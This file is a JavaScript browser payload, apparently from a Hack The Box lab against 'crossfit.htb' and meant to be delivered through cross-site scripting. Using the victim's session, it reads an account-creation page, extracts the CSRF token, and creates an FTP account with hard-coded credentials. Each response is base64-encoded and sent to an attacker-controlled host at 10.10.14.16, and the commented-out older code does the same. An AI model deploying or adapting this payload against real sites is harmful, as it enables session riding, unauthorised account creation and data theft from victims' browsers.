target0 = 'http://ftp.crossfit.htb/';
target1 = 'http://ftp.crossfit.htb/accounts/create';
createTarget = 'http://ftp.crossfit.htb/accounts';
attackerHost = 'http://10.10.14.16/';
user='piggy77';
pass='pigparty123';

/*
 * Could've just set open = false for non async... but let's just try this with promises...
 */

//retrieve a remote page and the response contents
function getPage(xhr, target) {
	//var xhr = new XMLHttpRequest();
	return new Promise((resolve, reject) => {
		xhr.onreadystatechange = (e) => {
			if (xhr.readyState !== 4){
				return;
			}
			if (xhr.status === 200){
				resolve(xhr.responseText);
			}
			else{
				reject(xhr.statusText);
			}
		};
		xhr.open('GET',target);
		xhr.send();
	});
}

//send a creation request with CSRF token
function sendCreateRequest(xhr, respText){
	var parser = new DOMParser();
	var responseDoc = parser.parseFromString(respText, "text/html");
	token = responseDoc.getElementsByName("_token")[0].value;
	//var xhr = new XMLHttpRequest();
	return new Promise((resolve,reject) =>{
		xhr.onreadystatechange = (e) => {
			if (xhr.readyState!==4){
				return;
			}
			//if (xhr.status === 200){
				resolve(xhr.responseText);	
			//}
		};
		
		var params = '_token='+token + '&username='+user + '&pass='+pass + '&submit=submit';
		xhr.open('POST', createTarget);
		//xhr.open('GET', attackerHost+'token/'+params); //debbuging send to self
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send(params);
		//xhr.send(); //debugging

	});
}

//show a response to a page for our debugging
function showResp(respText,preamble) {
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = (e) => {
		if (xhr.readyState !== 4){
			return;
		}
	}
		xhr.open('GET',attackerHost + preamble + '/' + btoa(respText));
		xhr.send();
	
}

//getCSRFToken(target1).then(res => sendSecond(res)).then( res => showResp(res)) ; 
xhr = new XMLHttpRequest;
xhr.withCredentials = true; //we need this to maintain state i believe, otherwise it cant match csrf token to anything

getPage(xhr, target1).then(res=> {
	showResp(res,'csrfreq')
	return sendCreateRequest(xhr, res)
}).then(res2 => showResp(res2,'createResp')).then(res => getPage(xhr,target0)).then(finalResp => showResp(finalResp,'acctList'));



//old code
/*
req = new XMLHttpRequest;
req.onreadystatechange = function() {
	    if (req.readyState == 4) {
		                req2 = new XMLHttpRequest;
		                req2.open('GET', 'http://10.10.14.16/' + btoa(this.responseText),false);
		                req2.send();
		            }
}
req.open('GET', target, false);
req.send()


req3 = new XMLHttpRequest;
req3.onreadystatechange = function() {
	if (req3.readyState == 4){
			req4 = new XMLHttpRequest;
			req4.open('GET','http://10.10.14.16/' + 'test' , false);
			req4.send();
	}

}
req3.open('GET',target,false);
req3.send()

*/
